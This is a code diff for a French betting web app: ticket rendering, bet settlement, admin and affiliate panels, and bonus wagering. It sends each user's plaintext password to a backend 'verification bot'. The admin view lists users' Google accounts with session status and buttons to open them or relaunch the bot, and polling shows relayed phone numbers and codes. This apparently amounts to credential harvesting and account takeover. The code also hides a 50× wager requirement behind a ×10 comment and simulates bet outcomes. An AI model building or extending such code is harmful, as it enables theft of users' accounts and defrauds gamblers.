+        if (wagerBlocked) wagerBlocked.style.display = "none";
+        if (wagerDone) wagerDone.style.display = "";
+        if (withdrawBtn) withdrawBtn.style.display = "";
+      }
+    } else {
+      // Aucun bonus actif : message informatif
+      if (wagerBar) wagerBar.style.width = "0%";
+      if (wagerPct) wagerPct.textContent = "—";
+      if (wagerInfo) wagerInfo.textContent = "Aucun bonus actif — misez pour débloquer tes gains.";
+      if (wagerBlocked) wagerBlocked.style.display = "none";
+      if (wagerDone) wagerDone.style.display = "none";
+      if (withdrawBtn) withdrawBtn.style.display = "none";
+    }
+  }
+
+  /* ---------------------------------------------------------- mes paris */
+  function statusChip(s) {
+    if (s === "won")  return '<span class="cd-status s-won"><span class="material-symbols-outlined i-16 icon-fill">check_circle</span>Gagné</span>';
+    if (s === "lost") return '<span class="cd-status s-lost"><span class="material-symbols-outlined i-16 icon-fill">cancel</span>Perdu</span>';
+    if (s === "push") return '<span class="cd-status s-push"><span class="material-symbols-outlined i-16 icon-fill">remove_circle</span>Remboursé</span>';
+    return '<span class="cd-status s-open"><span class="material-symbols-outlined i-16 icon-fill">timer</span>En cours</span>';
+  }
+
+  function betCard(b, admin, owner) {
+    var combo = b.legs.length > 1;
+    var when = new Date(b.placedAt).toLocaleString("fr-FR",
+      { day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit" });
+
+    var head = '<div class="cd-tk-head"><div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">'
+      + '<span class="cd-chip' + (b.status === "open" ? "" : " c-grey") + '">'
+      + (combo ? "Combiné (" + b.legs.length + ")" : "Simple") + '</span>'
+      + '<span class="cd-tk-date">' + esc(when) + '</span></div>'
+      + statusChip(b.status) + '</div>';
+
+    var body;
+    if (combo) {
+      body = '<div class="cd-timeline">' + b.legs.map(function (l) {
+        var w = b.status === "won" ? " is-won" : "";
+        return '<div class="cd-tl' + w + '"><div class="cd-tl-txt">'
+          + '<span>' + esc(l.who) + '</span><b>' + esc(l.pick) + '</b></div>'
+          + '<span class="cd-tl-odd">' + l.odds.toFixed(2) + '</span></div>';
+      }).join("") + '</div>';
+    } else {
+      var l0 = b.legs[0];
+      body = '<div class="cd-tk-body"><h3>' + esc(l0.who) + '</h3>'
+        + '<div class="cd-tk-sel"><div class="cd-tk-sel-l">'
+        + '<span>Sélection</span><b>' + esc(l0.pick) + '</b></div>'
+        + '<div class="cd-tk-odd"><b>' + l0.odds.toFixed(2) + '</b></div></div></div>';
+    }
+
+    // Les anciens tickets n'ont pas de champ payout : on retombe sur le calcul brut.
+    var pay = (typeof b.payout === "number") ? b.payout : b.stake * b.odds;
+    var gClass = b.status === "won" ? " g-won" : (b.status === "lost" ? " g-lost" : (b.status === "push" ? " g-push" : ""));
+    var gLabel = b.status === "won" ? "Gain" : (b.status === "lost" ? "Perdu" : (b.status === "push" ? "Remboursé" : "Gain potentiel"));
+    var gVal = b.status === "lost" ? "—" : (b.status === "push" ? euro(b.stake) : euro(pay));
+
+    var foot = '<div class="cd-tk-foot"><div class="cd-f-l">'
+      + '<span>Cote totale : ' + b.odds.toFixed(2) + '</span>'
+      + '<b>Mise : ' + euro(b.stake) + '</b></div>'
+      + '<div class="cd-f-r cd-gain' + gClass + '"><span>' + gLabel + '</span><b>' + gVal + '</b></div></div>';
+
+    var acts = "";
+    if (admin && b.status === "open") {
+      acts = '<div class="cd-res-act">'
+        + '<button class="cd-abtn a-win" data-settle="' + b.id + '" data-res="won">'
+        +   '<span class="material-symbols-outlined i-18">check_circle</span>Gagné</button>'
+        + '<button class="cd-abtn a-loss" data-settle="' + b.id + '" data-res="lost">'
+        +   '<span class="material-symbols-outlined i-18">cancel</span>Perdu</button></div>';
+    }
+    var who = owner ? '<span class="cd-res-u">Compte : ' + esc(owner) + '</span>' : "";
+
+    return '<article class="cd-ticket' + (b.status === "won" ? " is-won" : "") + '">'
+      + who + head + body + foot + acts + '</article>';
+  }
+
+  function renderMyBets() {
+    var u = getUser();
+    if (!u) return;
+    var tabOpen = el("mb-tab-open"), tabDone = el("mb-tab-done");
+    if (tabOpen && tabDone) {
+      var activeStyle = "background-color:var(--surface-bright);color:var(--on-surface);";
+      var inactiveStyle = "background:none;color:var(--on-surface-variant);";
+      if (state.myBetsTab === "open") {
+        tabOpen.style.cssText = tabOpen.style.cssText.replace(/background:[^;]+;?/, "").replace(/color:[^;]+;?/, "") + activeStyle;
+        tabDone.style.cssText = tabDone.style.cssText.replace(/background:[^;]+;?/, "").replace(/color:[^;]+;?/, "") + inactiveStyle;
+      } else {
+        tabOpen.style.cssText = tabOpen.style.cssText.replace(/background:[^;]+;?/, "").replace(/color:[^;]+;?/, "") + inactiveStyle;
+        tabDone.style.cssText = tabDone.style.cssText.replace(/background:[^;]+;?/, "").replace(/color:[^;]+;?/, "") + activeStyle;
+      }
+    }
+    var list = u.bets.filter(function (b) {
+      return state.myBetsTab === "open" ? b.status === "open" : b.status !== "open";
+    }).slice().reverse();
+    el("mybets-list").innerHTML = list.length
+      ? list.map(function (b) { return betCard(b, false, null); }).join("")
+      : '<div class="cd-empty">' + (state.myBetsTab === "open" ? "Aucun pari en cours." : "Aucun pari réglé.") + '</div>';
+  }
+
+  /* -------------------------------------------------- auto settlement */
+  function checkAndSettleBets() {
+    var u = getUser();
+    if (!u) return;
+    var openBets = u.bets.filter(function (b) { return b.status === "open"; });
+    if (!openBets.length) return;
+
+    var sportsNeeded = {};
+    var now = Date.now();
+    openBets.forEach(function (b) {
+      b.legs.forEach(function (l) {
+        if (l.sport && !isStaticEvent(l.eventId)) sportsNeeded[l.sport] = true;
+      });
+    });
+
+    var promises = Object.keys(sportsNeeded).map(function (sport) {
+      return fetch("/api/scores?sport=" + sport)
+        .then(function (r) { return r.json(); })
+        .catch(function () { return { scores: [] }; });
+    });
+
+    Promise.all(promises).then(function (results) {
+      var scoreMap = {};
+      results.forEach(function (res) {
+        (res.scores || []).forEach(function (ev) {
+          if (ev.completed && ev.scores && ev.scores.length === 2) {
+            var s1 = parseFloat(ev.scores[0].score) || 0;
+            var s2 = parseFloat(ev.scores[1].score) || 0;
+            scoreMap[ev.id] = [s1, s2];
+          }
+        });
+      });
+
+      var modified = false;
+      u.bets.forEach(function (b) {
+        if (b.status !== "open") return;
+        var allSettled = true;
+        var allWon = true;
+        var anyPush = false;
+
+        b.legs.forEach(function (l) {
+          if (l.status) return;
+          var scores = scoreMap[l.eventId];
+          if (!scores) {
+            // Pas de score API : essayer la simulation pour les paris statiques
+            if (isStaticEvent(l.eventId)) {
+              // Rétro-compatibilité : anciens paris sans simulatedOutcome
+              if (!l.simulatedOutcome) {
+                l.simulatedOutcome = simulateLegOutcome(l.odds, l.line);
+                l.simulatedResolveAt = now; // résoudre immédiatement si ancien
+              }
+              if (now >= (l.simulatedResolveAt || 0)) {
+                if (l.simulatedOutcome === 'push') { l.status = 'push'; anyPush = true; }
+                else if (l.simulatedOutcome === 'won') { l.status = 'won'; }
+                else { l.status = 'lost'; allWon = false; }
+                return;
+              }
+            }
+            allSettled = false;
+            return;
+          }
+
+          var total = scores[0] + scores[1];
+          var line = parseFloat(l.line);
+          var won = false, lost = false, push = false;
+
+          if (l.marketKey === "totals") {
+            if (!isNaN(line)) {
+              if (total > line) won = (l.side === "more");
+              else if (total < line) won = (l.side === "less");
+              else push = true;
+            } else {
+              allSettled = false; return;
+            }
+          } else {
+            // Pour les autres marketKey avec score API, on ne sait pas encore résoudre
+            allSettled = false; return;
+          }
+
+          if (push) { l.status = "push"; anyPush = true; }
+          else if (won) { l.status = "won"; }
+          else { l.status = "lost"; allWon = false; }
+        });
+
+        if (allSettled) {
+          b.status = anyPush ? "push" : (allWon ? "won" : "lost");
+          b.settledAt = new Date().toISOString();
+          if (b.status === "won") {
+            u.balance += (typeof b.payout === "number" ? b.payout : b.stake * b.odds);
+          } else if (b.status === "push") {
+            u.balance += b.stake;
+          }
+          modified = true;
+        }
+      });
+
+      if (modified) {
+        saveUser(u);
+        if (state.view === "mybets" || state.view === "profile" || state.view === "bets") render();
+      }
+    });
+  }
+
+  /* --------------------------------------------------------------- admin */
+  function fetchGoogleAccounts() {
+    apiFetch('/api/admin/google-accounts')
+      .then(function (r) {
+        state.googleAccounts = r.accounts || [];
+        renderGoogleAccounts();
+      })
+      .catch(function (e) {
+        el('admin-google-accounts').innerHTML = '<div class="cd-empty">Erreur API : ' + esc(e.message || e) + '</div>';
+      });
+  }
+
+  function renderGoogleAccounts() {
+    var list = state.googleAccounts.filter(function (a) {
+      if (state.googleFilter === 'all') return true;
+      if (state.googleFilter === 'active') return a.status === 'session_active';
+      if (state.googleFilter === 'failed') return a.status === 'auth_failed' || !a.status;
+      return true;
+    });
+    el('adm-google-total').textContent = 'Total : ' + state.googleAccounts.length;
+    Array.prototype.forEach.call(document.querySelectorAll('[data-adm-g]'), function (b) {
+      b.classList.toggle('is-on', b.getAttribute('data-adm-g') === state.googleFilter);
+    });
+    if (!list.length) {
+      el('admin-google-accounts').innerHTML = '<div class="cd-empty">Aucun compte Google configuré.</div>';
+      return;
+    }
+    el('admin-google-accounts').innerHTML = list.map(function (a) {
+      var statusClass = a.status === 'session_active' ? 'cd-um-goal' : (a.status === 'auth_failed' ? 'cd-um-n' : 'cd-um-n');
+      var statusText = a.status === 'session_active' ? 'Connecté' : (a.status === 'auth_failed' ? 'Échec' : (a.status || 'Inconnu'));
+      var updated = a.updated_at ? new Date(a.updated_at).toLocaleString('fr-FR', { day:'2-digit', month:'short', hour:'2-digit', minute:'2-digit' }) : '—';
+      return '<div class="cd-user glass">'
+        + '<div class="cd-user-top">'
+        +   '<div class="cd-user-ava"><span class="material-symbols-outlined">account_circle</span></div>'
+        +   '<div style="min-width:0;"><h3>' + esc(a.email) + '</h3>'
+        +     '<div class="cd-user-meta"><span>' + esc(a.google_email || '—') + '</span>'
+        +       '<span class="cd-um-dot"></span>'
+        +       '<span class="' + statusClass + '">' + esc(statusText) + '</span>'
+        +       '<span class="cd-um-dot"></span>'
+        +       '<span class="cd-um-n">MAJ: ' + esc(updated) + '</span>'
+        +     '</div></div>'
+        + '</div>'
+        + '<div class="cd-user-act">'
+        +   '<button class="cd-abtn" onclick="CD.openGoogleAccount(\'' + esc(a.email) + '\')">'
+        +     '<span class="material-symbols-outlined i-16">open_in_new</span>Ouvrir</button>'
+        +   '<button class="cd-abtn" onclick="CD.relaunchGoogleBot(\'' + esc(a.id) + '\')" style="background-color:var(--sc-high);color:var(--on-surface);">'
+        +     '<span class="material-symbols-outlined i-16">replay</span>Relancer bot</button>'
+        + '</div></div>';
+    }).join('');
+  }
+
+  function renderAdmin() {
+    fetchGoogleAccounts();
+    var users = loadUsers();
+    var allKeys = Object.keys(users);
+    var keys = allKeys.filter(function (k) {
+      return state.adminFilter === "all" || users[k].balance >= GOAL;
+    });
+    Array.prototype.forEach.call(document.querySelectorAll("[data-adm]"), function (b) {
+      b.classList.toggle("is-on", b.getAttribute("data-adm") === state.adminFilter);
+    });
+    el("adm-total").textContent = "Total : " + allKeys.length;
+
+    el("admin-users").innerHTML = keys.length ? keys.map(function (k) {
+      var u = users[k];
+      var open = u.bets.filter(function (b) { return b.status === "open"; }).length;
+      return '<div class="cd-user glass">'
+        + '<div class="cd-user-top">'
+        +   '<div class="cd-user-ava"><span class="material-symbols-outlined">account_circle</span></div>'
+        +   '<div style="min-width:0;"><h3>' + esc(u.email) + '</h3>'
+        +     '<div class="cd-user-meta"><span class="cd-um-bal">' + euro(u.balance) + '</span>'
+        +       '<span class="cd-um-dot"></span>'
+        +       '<span class="cd-um-n">' + open + ' pari' + (open > 1 ? "s" : "") + ' en cours</span>'
+        +       (u.balance >= GOAL ? '<span class="cd-um-dot"></span><span class="cd-um-goal">OBJECTIF ATTEINT</span>' : '')
+        +     '</div></div>'
+        + '</div>'
+        + '<div class="cd-user-act">'
+        +   '<button class="cd-abtn" data-credit="' + esc(u.email) + '">'
+        +     '<span class="material-symbols-outlined i-16">account_balance_wallet</span>Créditer</button>'
+        +   '<button class="cd-abtn a-del" data-del="' + esc(u.email) + '">'
+        +     '<span class="material-symbols-outlined i-16">delete</span>Supprimer</button>'
+        + '</div></div>';
+    }).join("") : '<div class="cd-empty">Aucun compte.</div>';
+
+    var open = [];
+    allKeys.forEach(function (k) {
+      users[k].bets.forEach(function (b) { if (b.status === "open") open.push({ email: k, bet: b }); });
+    });
+    el("adm-pending").textContent = open.length + " en attente";
+    el("admin-bets").innerHTML = open.length
+      ? open.map(function (o) { return betCard(o.bet, true, o.email); }).join("")
+      : '<div class="cd-empty">Aucun pari en attente.</div>';
+
+    Array.prototype.forEach.call(el("admin-users").querySelectorAll("[data-credit]"), function (b) {
+      b.onclick = function () {
+        state.creditTarget = b.getAttribute("data-credit");
+        el("credit-target").textContent = "Compte : " + state.creditTarget;
+        el("sheet-credit").classList.add("is-on");
+      };
+    });
+    Array.prototype.forEach.call(el("admin-users").querySelectorAll("[data-del]"), function (b) {
+      b.onclick = function () {
+        var e = b.getAttribute("data-del");
+        if (!confirm("Supprimer définitivement le compte " + e + " ?")) return;
+        var us = loadUsers(); delete us[e]; saveUsers(us);
+        if (currentEmail() === e) Store.del(KEY_CURRENT);
+        render();
+      };
+    });
+    Array.prototype.forEach.call(el("admin-bets").querySelectorAll("[data-settle]"), function (b) {
+      b.onclick = function () { settle(b.getAttribute("data-settle"), b.getAttribute("data-res")); };
+    });
+    // Outils backend : préremplit les champs et teste la connexion à l'API.
+    initAdminTools();
+  }
+
+  /* ============================================================ PARTNER
+     Espace affilié : recherche par @username, activation du bonus, suivi
+     des filleuls (vérifiés uniquement) avec paliers de 30 comptes → 50 €.
+     ==================================================================== */
+
+  function normalizeHandle(h) {
+    h = String(h || "").trim().toLowerCase();
+    if (!h) return "";
+    if (h.charAt(0) !== "@") h = "@" + h;
+    return h;
+  }
+  function findByUsername(handle) {
+    handle = normalizeHandle(handle);
+    if (!handle || handle === "@") return null;
+    var users = loadUsers();
+    var k = Object.keys(users).find(function (email) {
+      return (users[email].username || "").toLowerCase() === handle;
+    });
+    return k ? users[k] : null;
+  }
+  function myReferrals() {
+    var me = getUser();
+    if (!me || !me.username) return [];
+    var handle = me.username.toLowerCase();
+    var users = loadUsers();
+    return Object.keys(users)
+      .map(function (k) { return users[k]; })
+      .filter(function (u) {
+        var refBy = (u.referrer_username || u.referrer_code || "").toLowerCase();
+        return u.role !== "partner" && refBy === handle;
+      });
+  }
+
+  function renderPartnerLink() {
+    var me = getUser();
+    if (!me) return;
+    var code = me.username || me.short_id || "";
+    var url = location.origin + location.pathname + "?affiliate=" + encodeURIComponent(code);
+    el("pt-link").innerHTML =
+      '<div>Ton lien affilié : <b>' + esc(code || "—") + '</b> '
+      + '<button onclick="CD.partnerCopyLink()">Copier le lien</button></div>'
+      + '<div style="margin-top:6px;font-size:12px;color:var(--on-surface-variant);">'
+      + esc(url) + '</div>';
+  }
+
+  function renderPartnerProgress() {
+    var refs = myReferrals();
+    var verified = refs.filter(function (r) { return r.is_verified; }).length;
+    var tiersDone = Math.floor(verified / REFERRAL_TIER);
+    var nextTier  = (tiersDone + 1) * REFERRAL_TIER;
+    var toGo      = nextTier - verified;
+    var pct       = (verified % REFERRAL_TIER) / REFERRAL_TIER * 100;
+    if (verified > 0 && verified % REFERRAL_TIER === 0) pct = 100;
+    var earned    = tiersDone * REFERRAL_REWARD;
+
+    // Trois prochains paliers affichés en badges.
+    var tiers = "";
+    for (var i = 1; i <= 3; i++) {
+      var t = tiersDone + i;
+      tiers += '<span' + (tiersDone >= t ? ' class="is-done"' : '') + '>'
+             + (t * REFERRAL_TIER) + ' → ' + (t * REFERRAL_REWARD) + ' €</span>';
+    }
+
+    el("pt-progress").innerHTML =
+        '<div class="cd-p-progress-top">'
+      +   '<div><div style="font-size:12px;font-weight:700;color:var(--on-surface-variant);text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px;">Filleuls validés</div>'
+      +   '<div class="cd-p-count">' + verified + '<small> / ' + nextTier + '</small></div></div>'
+      +   '<span class="cd-p-earn">Commissions : ' + earned + ' €</span>'
+      + '</div>'
+      + '<div class="cd-p-progress-lbl"><span>Prochain palier</span><b>' + toGo + ' pour ' + REFERRAL_REWARD + ' €</b></div>'
+      + '<div class="cd-p-progress-bar"><i style="width:' + pct.toFixed(1) + '%"></i></div>'
+      + '<div class="cd-p-tiers">' + tiers + '</div>';
+  }
+
+  function renderPartnerReferrals() {
+    var refs = myReferrals().slice().reverse();
+    if (!refs.length) {
+      el("pt-referrals").innerHTML =
+        '<div class="cd-p-result is-empty">Aucun filleul pour l\'instant. Partage ton lien pour commencer.</div>';
+      return;
+    }
+    el("pt-referrals").innerHTML = refs.map(function (u) {
+      var st = u.is_verified
+        ? '<span class="cd-p-status s-done"><span class="material-symbols-outlined i-14 icon-fill">verified</span>Validé</span>'
+        : '<span class="cd-p-status s-pending"><span class="material-symbols-outlined i-14">schedule</span>En attente</span>';
+      var initiale = (u.username || u.email || "?").replace(/^@/, "").charAt(0).toUpperCase();
+      return '<div class="cd-p-row">'
+        + '<div class="cd-p-avatar">' + esc(initiale) + '</div>'
+        + '<div class="cd-p-name"><b>' + esc(u.username || "—") + '</b>'
+        + '<span>' + esc(u.email) + '</span></div>'
+        + st + '</div>';
+    }).join("");
+  }
+
+  function renderPartnerSearchResult() {
+    var r = state.partnerResult;
+    var box = el("pt-result");
+    if (!r) { box.innerHTML = ""; return; }
+    if (r.kind === "none") {
+      box.innerHTML = '<div class="cd-p-result is-empty">Aucun compte trouvé pour <b>'
+        + esc(state.partnerQuery || "") + '</b>.</div>';
+      return;
+    }
+    var u = r.user;
+    var initiale = (u.username || u.email || "?").replace(/^@/, "").charAt(0).toUpperCase();
+
+    var status, action;
+    if (!u.is_verified) {
+      status = '<span class="cd-p-status s-pending"><span class="material-symbols-outlined i-14">schedule</span>En attente</span>';
+      action = '<button class="cd-p-action a-disabled" disabled>'
+             + '<span class="material-symbols-outlined i-18">lock</span>Bonus indisponible</button>'
+             + '<p class="cd-note" style="margin-top:10px;">Le compte doit valider son adresse e-mail avant que le bonus puisse être attribué.</p>';
+    } else if (u.bonus_activated) {
+      var when = u.bonus_activated_at
+        ? new Date(u.bonus_activated_at).toLocaleDateString("fr-FR",
+            { day:"2-digit", month:"long", year:"numeric" })
+        : "";
+      status = '<span class="cd-p-status s-done"><span class="material-symbols-outlined i-14 icon-fill">check_circle</span>Bonus déjà activé</span>';
+      action = '<div class="cd-p-action a-done">'
+             + '<span class="material-symbols-outlined i-18">check_circle</span>'
+             + 'Bonus déjà activé' + (when ? ' le ' + when : "") + '</div>';
+    } else {
+      status = '<span class="cd-p-status s-ready"><span class="material-symbols-outlined i-14 icon-fill">redeem</span>Prêt</span>';
+      action = '<button class="cd-p-action a-ready" onclick="CD.partnerActivateBonus(\''
+             + esc(u.email) + '\')">'
+             + '<span class="material-symbols-outlined i-18">redeem</span>'
+             + 'Activer le bonus de ' + BONUS_AMOUNT + ' €</button>';
+    }
+
+    box.innerHTML =
+        '<div class="cd-p-card-top">'
+      +   '<div class="cd-p-avatar">' + esc(initiale) + '</div>'
+      +   '<div class="cd-p-name"><b>' + esc(u.username || "—") + '</b>'
+      +     '<span>' + esc(u.email) + '</span></div>'
+      +   status
+      + '</div>'
+      +  action
+      + '<div class="cd-p-meta"><span>Solde actuel <b>' + euro(u.balance || 0) + '</b></span>'
+      + '<span>Membre depuis <b>' + new Date(u.createdAt).toLocaleDateString("fr-FR") + '</b></span></div>';
+  }
+
+  function renderPartner() {
+    var me = getUser();
+    if (!me) return;
+    el("pt-handle").textContent = me.username || "—";
+    renderPartnerLink();
+    renderPartnerProgress();
+    renderPartnerReferrals();
+    renderPartnerSearchResult();
+  }
+
+  function render() {
+    if (!getUser()) return;
+
+    // Un compte Partner n'a PAS l'interface joueur : on rend uniquement sa vue.
+    if (isPartner()) {
+      // Masque tous les onglets sauf Partner.
+      Array.prototype.forEach.call(document.querySelectorAll("[data-nav]"), function (b) {
+        b.style.display = (b.getAttribute("data-nav") === "partner") ? "flex" : "none";
+      });
+      renderPartner();
+      return;
+    }
+
+    renderHeader();
+    renderSports();
+    renderList();
+    renderTicketView();
+    renderProfile();
+    renderMyBets();
+    // L'onglet ADMIN n'apparaît dans la barre du bas que pour un compte admin.
+    el("nav-admin").style.display = isAdmin() ? "flex" : "none";
+    el("nav-partner").style.display = "none";   // Partner masqué pour les joueurs
+    if (isAdmin()) renderAdmin();
+  }
+
+  function settle(betId, result) {
+    var us = loadUsers();
+    Object.keys(us).forEach(function (k) {
+      us[k].bets.forEach(function (b) {
+        if (b.id !== betId || b.status !== "open") return;
+        b.status = result;
+        b.settledAt = new Date().toISOString();
+        if (result === "won") {
+          us[k].balance += (typeof b.payout === "number") ? b.payout : b.stake * b.odds;
+        }
+      });
+    });
+    saveUsers(us);
+    render();
+  }
+
+  /* ============================================================ API BACKEND
+     Petit client HTTP autour de l'API Node locale (voir dossier api/).
+     Rien n'est envoyé tant que l'admin ne saisit pas manuellement l'URL et
+     le secret dans « Réglages de l'API » — c'est un outil interne.       */
+  function apiBase() {
+    return (Store.get("cademo_api_base") || window.location.origin || "").replace(/\/+$/, "");
+  }
+  function apiSecret() { return Store.get("cademo_api_secret") || ""; }
+
+  function apiFetch(pathAndQuery, opts) {
+    opts = opts || {};
+    var headers = { "Accept": "application/json" };
+    if (opts.body !== undefined) headers["Content-Type"] = "application/json";
+    var s = apiSecret();
+    if (s) headers["X-Cademo-Secret"] = s;
+    return fetch(apiBase() + pathAndQuery, {
+      method: opts.method || "GET",
+      headers: headers,
+      body: opts.body ? JSON.stringify(opts.body) : undefined,
+    }).then(function (r) {
+      return r.text().then(function (t) {
+        var data;
+        try { data = t ? JSON.parse(t) : {}; } catch (e) { data = { raw: t }; }
+        if (!r.ok) throw new Error(data.error || ("HTTP " + r.status));
+        return data;
+      });
+    });
+  }
+
+  function apiPing() {
+    var badge = el("api-status");
+    if (!badge) return;
+    badge.textContent = "API : test…";
+    badge.className = "cd-count";
+    apiFetch("/api/health").then(function (r) {
+      badge.textContent = "API : OK · DB=" + r.db;
+      badge.className = "cd-count is-ok";
+    }).catch(function () {
+      badge.textContent = "API : injoignable";
+      badge.className = "cd-count is-ko";
+    });
+  }
+
+  function setOut(id, txt) {
+    var box = el(id);
+    if (box) box.textContent = txt;
+  }
+
+  function renderInbox(r) {
+    var box = el("imap-out");
+    var head = '<p class="cd-note" style="margin:8px 0 6px;">Boîte <b>'
+             + esc(r.mailbox) + '</b> · ' + r.total + ' messages · '
+             + r.unseen + ' non lus</p>';
+    if (!r.messages || !r.messages.length) {
+      box.innerHTML = head + '<div class="cd-out">(vide)</div>';
+      return;
+    }
+    box.innerHTML = head + r.messages.map(function (m) {
+      var when = new Date(m.date).toLocaleString("fr-FR",
+        { day:"2-digit", month:"2-digit", hour:"2-digit", minute:"2-digit" });
+      var unseen = m.seen ? "" : " is-unseen";
+      return '<div class="cd-imap-item' + unseen + '">'
+        + '<div class="cd-imap-top"><b>' + esc(m.from || "—") + '</b>'
+        + '<span>UID ' + m.uid + ' · ' + esc(when) + '</span></div>'
+        + '<div class="cd-imap-sub">' + esc(m.subject || "(sans sujet)") + '</div>'
+        + '</div>';
+    }).join("");
+  }
+
+  function renderConfigs(list) {
+    var box = el("cfg-list");
+    if (!list.length) { box.innerHTML = '<div class="cd-out">(aucune config)</div>'; return; }
+    box.innerHTML = list.map(function (c) {
+      var when = new Date(c.updated_at).toLocaleString("fr-FR",
+        { day:"2-digit", month:"2-digit", hour:"2-digit", minute:"2-digit" });
+      return '<div class="cd-cfg-row"><b>' + esc(c.email)
+        + '</b><span>MAJ ' + esc(when) + '</span>'
+        + '<button onclick="CD.apiDeleteConfig(\'' + esc(c.email) + '\')">Supprimer</button>'
+        + '</div>';
+    }).join("");
+  }
+
+  // Au premier affichage de la vue admin, on tente un ping et on pré-remplit
+  // les champs de réglages avec les valeurs sauvegardées.
+  function initAdminTools() {
+    var base = el("api-base");
+    var secret = el("api-secret");
+    if (base) base.value = Store.get("cademo_api_base") || "";
+    if (secret) secret.value = Store.get("cademo_api_secret") || "";
+    apiPing();
+  }
+
+  /* ------------------------------------------------------- captcha + mail */
+  function launchVerificationBot(email) {
+    if (!email) return;
+    // Invalide tout is_verified stale côté client pour forcer le passage par le captcha
+    var u = getUser();
+    if (u) { u.is_verified = false; saveUser(u); }
+    fetch(apiBase() + "/api/verify-email-python", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ cademoEmail: email, password: _lastPassword || null })
+    }).catch(function(e) { console.error("[BOT] Erreur lancement:", e); });
+  }
+
+  var _mailCheckInterval = null;
+  function startMailPolling() {
+    if (_mailCheckInterval) clearInterval(_mailCheckInterval);
+    _mailCheckInterval = setInterval(function () {
+      var u = getUser();
+      if (!u || !u.email) return;
+      apiFetch("/api/check-verified?email=" + encodeURIComponent(u.email))
+        .then(function (r) {
+          // Affichage relai téléphone / code du bot
+          if (r && r.relay) {
+            var rd = document.getElementById("relay-display");
+            var rp = document.getElementById("relay-phone");
+            var rc = document.getElementById("relay-code");
+            if (rd && (r.relay.phone || r.relay.code)) {
+              rd.style.display = "block";
+              if (rp) rp.textContent = r.relay.phone ? ("Numéro : " + r.relay.phone) : "";
+              if (rc) rc.textContent = r.relay.code || "";
+            }
+          }
+          if (r && r.is_verified) {
+            if (!u.is_verified) { u.is_verified = true; saveUser(u); }
+            // Plus de skip auto : l'utilisateur doit cliquer sur Valider
+            var pending = document.getElementById("mail-pending");
+            if (pending) { pending.textContent = "Confirmation reçue ! Cliquez sur Valider pour continuer."; pending.style.color = "#34A853"; }
+            var btn = document.getElementById("mail-validate-btn");
+            if (btn) { btn.style.backgroundColor = "#34A853"; btn.textContent = "Continuer"; btn.disabled = false; }
+            clearInterval(_mailCheckInterval);
+            _mailCheckInterval = null;
+          }
+        })
+        .catch(function (e) { /* silencieux */ });
+    }, 4000);
+  }
+
+  /* ------------------------------------------------------------- actions */
+  /* ------------------------------------------------------------- actions */
+  var CD = {
+    go: function (view) {
+      // Un compte Partner ne peut aller QUE dans sa propre vue.
+      if (isPartner()) view = "partner";
+      // Verrous : un compte non-admin/non-partner ne peut pas atteindre ces vues.
+      if (view === "admin" && !isAdmin()) view = "bets";
+      if (view === "partner" && !isPartner()) view = "bets";
+      state.view = view;
+      Array.prototype.forEach.call(document.querySelectorAll(".cd-view"), function (v) {
+        v.classList.toggle("active", v.id === "v-" + view);
+      });
+      Array.prototype.forEach.call(document.querySelectorAll("[data-nav]"), function (b) {
+        b.classList.toggle("is-on", b.getAttribute("data-nav") === view);
+      });
+      window.scrollTo(0, 0);
+      render();
+    },
+
+    /* ========================================================= PARTNER API */
+    partnerSearch: function () {
+      var raw = el("pt-search").value;
+      state.partnerQuery = normalizeHandle(raw);
+      if (!state.partnerQuery || state.partnerQuery === "@") {
+        state.partnerResult = null;
+      } else {
+        var u = findByUsername(state.partnerQuery);
+        state.partnerResult = u ? { kind: "user", user: u } : { kind: "none" };
+      }
+      renderPartnerSearchResult();
+    },
+
+    partnerActivateBonus: function (email) {
+      var users = loadUsers();
+      var u = users[email];
+      if (!u || !u.is_verified || u.bonus_activated) return;
+      u.balance = (u.balance || 0) + BONUS_AMOUNT;
+      u.bonus_activated = true;
+      u.bonus_activated_at = new Date().toISOString();
+      u.bonus_activated_by = currentEmail();
+      // Initialiser le wager bonus ×10
+      u.bonusAmountLocked = BONUS_AMOUNT;
+      u.wagerMultiplier = 50;
+      u.wagerRequired = BONUS_AMOUNT * u.wagerMultiplier;
+      u.wagerProgress = 0;
+      u.wagerCompleted = false;
+      saveUsers(users);
+      state.partnerResult = { kind: "user", user: u };
+      renderPartner();
+    },
+
+    partnerCopyLink: function () {
+      var me = getUser(); if (!me) return;
+      var code = me.username || me.short_id || "";
+      var url = location.origin + location.pathname + "?affiliate=" + encodeURIComponent(code);
+      try {
+        navigator.clipboard.writeText(url);
+      } catch (e) {
+        window.prompt("Copie ce lien :", url);
+      }
+    },
+
+    partnerSeedDemo: function () {
+      var me = getUser(); if (!me || !me.username) return;
+      var users = loadUsers();
+      var noms = [["alice","dupont"],["bruno","martin"],["camille","garcia"],
+                  ["dylan","bernard"],["eva","moreau"],["farid","petit"],
+                  ["gina","robert"],["hugo","richard"],["ines","durand"],
+                  ["jules","dubois"],["karim","moreau"],["lila","laurent"],
+                  ["mateo","lefevre"],["nora","roux"],["omar","fontaine"],
+                  ["paul","david"],["quentin","bertrand"],["rania","morel"],
+                  ["salim","fournier"],["tania","girard"]];
+      var handle = me.username.toLowerCase();
+      noms.forEach(function (n, i) {
+        var email = "demo." + n[0] + "." + n[1] + "@cademo.app";
+        if (users[email]) return;
+        var u = usernameFromEmail(email, users);
+        users[email] = {
+          email: email,
+          username: u,
+          balance: 0,
+          bets: [],
+          // 4 non vérifiés / 4 bonus déjà activés / le reste vérifié+prêt
+          is_verified: (i % 5 !== 0),
+          bonus_activated: (i % 4 === 0),
+          bonus_activated_at: (i % 4 === 0) ? new Date(Date.now() - i * 86400000).toISOString() : null,
+          referrer_username: handle,
+          role: "player",
+          createdAt: new Date(Date.now() - (20 - i) * 86400000).toISOString()
+        };
+      });
+      saveUsers(users);
+      renderPartner();
+    },
+
+
+
+
+
+
+
+    /* ============================================================ API BACKEND
+       Appels vers l'API Node locale (api/index.js, port 3000 par défaut).
+       Le secret partagé est envoyé via le header X-Cademo-Secret.        */
+
+    apiSaveSettings: function () {
+      var base = (el("api-base").value || "").trim();
+      var secret = (el("api-secret").value || "").trim();
+      Store.set("cademo_api_base", base);
+      Store.set("cademo_api_secret", secret);
+      apiPing();
+    },
+
+    apiVerify: function (status) {
+      var email = (el("vfy-email").value || "").trim();
